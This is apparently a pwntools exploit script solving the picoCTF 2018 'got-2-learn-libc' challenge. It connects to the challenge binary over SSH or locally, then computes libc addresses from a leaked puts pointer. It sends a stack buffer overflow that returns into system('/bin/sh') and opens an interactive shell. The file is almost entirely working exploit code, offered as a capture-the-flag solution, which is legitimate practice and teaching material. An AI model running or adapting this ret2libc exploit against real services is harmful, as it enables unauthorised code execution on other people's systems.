import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
	"c"
]

# Binary names
bin_fname = './vuln'
libc_fname = ''

# Remote
IP = ''
PORT = 0

# SSH
URL = '2018shell2.picoctf.com'
username = 'escapewq'
password = ''
bin_abs_path = '/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee'

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	debugging = True

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

# p.sendline(cyclic(100, n=8 if x64 else 4))
# buf = cyclic_find('', n=8 if x64 else 4) * 'a'

# Note - we weren't given the libc
# I found out which libc was being used by using this DB and downloaded it
# https://libc.blukat.me/

# Compute base_addr of libc
print p.recvuntil('puts: 0x')
puts_addr = int(p.recvline().strip(), 16)
log.info("PUTS: " + hex(puts_addr))
puts_offset = 0x5f140
libc_base = puts_addr - puts_offset

# Compute address of system
system_offset = 0x03a940
system_addr = libc_base + system_offset

# Compute address of bin/sh
binsh_offset = 0x15902b
binsh_addr = libc_base + binsh_offset

# Overflow
print p.recvuntil('Enter a string:')
buf = 'a' * 160
buf += p32(system_addr)
buf += 'bbbb'
buf += p32(binsh_addr)
p.sendline(buf)
p.interactive()
